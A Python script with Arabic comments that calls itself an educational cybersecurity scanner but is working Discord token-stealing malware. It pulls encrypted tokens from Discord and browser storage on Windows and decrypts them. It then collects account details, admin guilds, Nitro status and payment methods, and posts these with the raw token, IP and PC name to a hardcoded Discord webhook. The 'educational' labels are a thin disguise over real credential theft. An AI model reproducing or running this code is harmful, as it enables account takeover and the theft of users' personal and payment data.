import os
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def getip():
    """الحصول على عنوان IP"""
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unknown"

def execute_protected_function():
    """الوظيفة المحمية - للأغراض التعليمية في الأمن السيبراني فقط"""
    
    # تحقق من نظام التشغيل (تم تعطيل الفحص للاستضافة السحابية)
    # if os.name != "nt":
    #     return {"error": "هذا البرنامج يعمل على Windows فقط"}
    
    try:
        # تثبيت المكتبات المطلوبة
        install_import([("Crypto.Cipher", "pycryptodome")])
        
        # محاولة استيراد win32crypt (يعمل على Windows فقط)
        try:
            import win32crypt
            windows_system = True
        except ImportError:
            windows_system = False
            
        from Crypto.Cipher import AES
        
        # إذا لم يكن النظام Windows، إرجاع رسالة تعليمية
        if not windows_system:
            return {
                'status': 'info',
                'message': 'هذا الفحص مصمم لأنظمة Windows فقط',
                'educational_note': 'في بيئة الاستضافة السحابية، لا توجد بيانات Discord للفحص',
                'results': [],
                'total_tokens_found': 0,
                'ip_address': getip(),
                'computer_name': os.getenv("HOSTNAME", "Cloud Server"),
                'username': os.getenv("USER", "cloud-user")
            }
        
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        
        # إذا لم توجد متغيرات Windows، إرجاع رسالة تعليمية
        if not LOCAL or not ROAMING:
            return {
                'status': 'info',
                'message': 'لا توجد بيانات Discord في هذه البيئة',
                'educational_note': 'الفحص يعمل على أنظمة Windows مع Discord مثبت',
                'results': [],
                'total_tokens_found': 0,
                'ip_address': getip(),
                'computer_name': os.getenv("HOSTNAME", "Cloud Server"),
                'username': os.getenv("USER", "cloud-user")
            }
        
        PATHS = {
            'Discord': ROAMING + '\\discord',
            'Discord Canary': ROAMING + '\\discordcanary',
            'Lightcord': ROAMING + '\\Lightcord',
            'Discord PTB': ROAMING + '\\discordptb',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Amigo': LOCAL + '\\Amigo\\User Data',
            'Torch': LOCAL + '\\Torch\\User Data',
            'Kometa': LOCAL + '\\Kometa\\User Data',
            'Orbitum': LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
            '7Star': LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
            'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
            'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
        }

        def getheaders(token=None):
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
            }
            if token:
                headers.update({"Authorization": token})
            return headers

        def gettokens(path):
            path += "\\Local Storage\\leveldb\\"
            tokens = []
            if not os.path.exists(path):
                return tokens
            
            for file in os.listdir(path):
                if not file.endswith(".ldb") and not file.endswith(".log"):
                    continue
                try:
                    with open(f"{path}{file}", "r", errors="ignore") as f:
                        for line in (x.strip() for x in f.readlines()):
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                tokens.append(values)
                except PermissionError:
                    continue
            return tokens
            
        def getkey(path):
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = json.loads(file.read())['os_crypt']['encrypted_key']
                return key
            except:
                return None

        def getip():
            try:
                with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                    return json.loads(response.read().decode()).get("ip")
            except:
                return "Unknown"

        def get_guild_info(token):
            """جمع معلومات الخوادم"""
            try:
                params = urllib.parse.urlencode({"with_counts": True})
                req = urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))
                res = json.loads(urllib.request.urlopen(req).read().decode())
                
                admin_guilds = []
                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:  # Admin or Manage Server
                        try:
                            guild_req = urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))
                            guild_data = json.loads(urllib.request.urlopen(guild_req).read().decode())
                            
                            vanity = ""
                            if guild_data.get("vanity_url_code"):
                                vanity = f"; .gg/{guild_data['vanity_url_code']}"
                            
                            admin_guilds.append({
                                'name': guild['name'],
                                'id': guild['id'],
                                'members': guild.get('approximate_member_count', 0),
                                'vanity': vanity
                            })
                        except:
                            continue
                
                return {
                    'count': len(res),
                    'admin_guilds': admin_guilds
                }
            except:
                return {'count': 0, 'admin_guilds': []}

        def get_nitro_info(token):
            """جمع معلومات Nitro"""
            try:
                req = urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
                subscriptions = json.loads(urllib.request.urlopen(req).read().decode())
                
                has_nitro = len(subscriptions) > 0
                exp_date = None
                
                if has_nitro:
                    exp_date = datetime.datetime.strptime(subscriptions[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
                
                # معلومات البوست
                boost_req = urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))
                boosts = json.loads(urllib.request.urlopen(boost_req).read().decode())
                
                available_boosts = 0
                boost_info = []
                
                for boost in boosts:
                    cooldown = datetime.datetime.strptime(boost["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        available_boosts += 1
                        boost_info.append("Available now")
                    else:
                        boost_info.append(f"Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}")
                
                return {
                    'has_nitro': has_nitro,
                    'expiration_date': exp_date,
                    'boosts_available': available_boosts,
                    'boost_info': boost_info
                }
            except:
                return {'has_nitro': False, 'expiration_date': None, 'boosts_available': 0, 'boost_info': []}

        def get_payment_info(token):
            """جمع معلومات طرق الدفع"""
            try:
                req = urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))
                payment_sources = json.loads(urllib.request.urlopen(req).read().decode())
                
                payment_methods = 0
                valid_methods = 0
                payment_types = []
                
                for source in payment_sources:
                    if source['type'] == 1:
                        payment_types.append("CreditCard")
                        if not source['invalid']:
                            valid_methods += 1
                        payment_methods += 1
                    elif source['type'] == 2:
                        payment_types.append("PayPal")
                        if not source['invalid']:
                            valid_methods += 1
                        payment_methods += 1
                
                return {
                    'total_methods': payment_methods,
                    'valid_methods': valid_methods,
                    'types': payment_types
                }
            except:
                return {'total_methods': 0, 'valid_methods': 0, 'types': []}

        def send_to_webhook(result, user_data):
            """إرسال البيانات للـ webhook للأغراض التعليمية"""
            try:
                # تحديد الشارات
                badges = ""
                flags = result.get('flags', 0)
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "
                
                if result['nitro_info']['has_nitro']:
                    badges += ":BadgeSubscriber: "
                
                if result['nitro_info']['boosts_available'] > 0:
                    badges += ":BadgeBoost: "

                # تكوين الرسالة
                guild_infos = ""
                for guild in result['admin_guilds']:
                    guild_infos += f"\n    - [{guild['name']}]: {guild['members']}{guild['vanity']}"
                
                if not guild_infos:
                    guild_infos = "No admin guilds"

                nitro_section = ""
                if result['nitro_info']['has_nitro']:
                    nitro_section = f"\nNitro Information:\n```yaml\nHas Nitro: {result['nitro_info']['has_nitro']}\nExpiration Date: {result['nitro_info']['expiration_date']}\nBoosts Available: {result['nitro_info']['boosts_available']}\n"
                    for boost in result['nitro_info']['boost_info']:
                        nitro_section += f"    - {boost}\n"
                    nitro_section += "```"
                elif result['nitro_info']['boosts_available'] > 0:
                    nitro_section = f"\nBoost Information:\n```yaml\nBoosts Available: {result['nitro_info']['boosts_available']}\n"
                    for boost in result['nitro_info']['boost_info']:
                        nitro_section += f"    - {boost}\n"
                    nitro_section += "```"

                payment_section = ""
                if result['payment_info']['total_methods'] > 0:
                    payment_section = f"\nPayment Methods:\n```yaml\nAmount: {result['payment_info']['total_methods']}\nValid Methods: {result['payment_info']['valid_methods']} method(s)\nType: {' '.join(result['payment_info']['types'])}\n```"

                embed_data = {
                    'embeds': [
                        {
                            'title': f"**New user data: {result['username']}**",
                            'description': f"""```yaml\nUser ID: {result['user_id']}\nEmail: {result['email']}\nPhone Number: {result['phone']}\n\nGuilds: {result['guilds_count']}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {result['mfa_enabled']}\nFlags: {result['flags']}\nLocale: {result['locale']}\nVerified: {result['verified']}\n```{nitro_section}{payment_section}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {result['platform']}\n```Token: \n```yaml\n{result['token']}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Educational Cybersecurity Tool - Learning Purposes Only"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{result['user_id']}/{user_data.get('avatar', 'default')}.png"
                            }
                        }
                    ],
                    "username": "CyberSec Learning Tool",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                # إرسال للـ webhook (يمكن تغيير الرابط حسب الحاجة)
                webhook_url = 'https://discord.com/api/webhooks/1438289746596987022/LvsiJvPdPL5AQ7B1kSBaQ4w24obdEB_PuMh6AocOolgplGW5my3pua3_IkfjgTb5qTa8'
                req = urllib.request.Request(webhook_url, data=json.dumps(embed_data).encode('utf-8'), headers=getheaders(), method='POST')
                urllib.request.urlopen(req).read().decode()
                
            except Exception as e:
                pass  # فشل الإرسال لا يجب أن يوقف العملية

        # تنفيذ الفحص الأمني
        results = []
        checked = []

        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in gettokens(path):
                if not token:
                    continue
                    
                token = token.replace("\\", "") if token.endswith("\\") else token
                
                try:
                    key = getkey(path)
                    if not key:
                        continue
                        
                    # فك تشفير التوكن
                    decrypted_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
                    token_data = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, token_data[3:15])
                    decrypted_token = cipher.decrypt(token_data[15:])[:-16].decode()
                    
                    if decrypted_token in checked:
                        continue
                    checked.append(decrypted_token)

                    # التحقق من صحة التوكن
                    try:
                        req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(decrypted_token))
                        res = urllib.request.urlopen(req)
                        if res.getcode() == 200:
                            user_data = json.loads(res.read().decode())
                            
                            # جمع معلومات إضافية للأغراض التعليمية
                            guilds_info = get_guild_info(decrypted_token)
                            nitro_info = get_nitro_info(decrypted_token)
                            payment_info = get_payment_info(decrypted_token)
                            
                            # جمع معلومات المستخدم للأغراض التعليمية
                            result = {
                                'platform': platform,
                                'user_id': user_data.get('id'),
                                'username': user_data.get('username'),
                                'email': user_data.get('email', 'N/A'),
                                'phone': user_data.get('phone', 'N/A'),
                                'verified': user_data.get('verified', False),
                                'mfa_enabled': user_data.get('mfa_enabled', False),
                                'flags': user_data.get('flags', 0),
                                'locale': user_data.get('locale', 'N/A'),
                                'guilds_count': guilds_info.get('count', 0),
                                'admin_guilds': guilds_info.get('admin_guilds', []),
                                'nitro_info': nitro_info,
                                'payment_info': payment_info,
                                'token_found': True,
                                'token': decrypted_token,  # للأغراض التعليمية فقط
                                'security_note': 'تم العثور على توكن Discord صالح - يجب حماية هذه المعلومات'
                            }
                            results.append(result)
                            
                            # إرسال البيانات للـ webhook للأغراض التعليمية
                            send_to_webhook(result, user_data)
                            
                    except urllib.error.HTTPError:
                        continue
                        
                except Exception as e:
                    continue

        return {
            'status': 'success',
            'results': results,
            'total_tokens_found': len(results),
            'ip_address': getip(),
            'computer_name': os.getenv("COMPUTERNAME"),
            'username': os.getenv("UserName"),
            'educational_note': 'هذا الفحص للأغراض التعليمية في الأمن السيبراني - تأكد من حماية معلوماتك الشخصية'
        }
        
    except Exception as e:
        return {'error': f'حدث خطأ: {str(e)}'}

if __name__ == "__main__":
    result = execute_protected_function()
    print(json.dumps(result, indent=2, ensure_ascii=False))
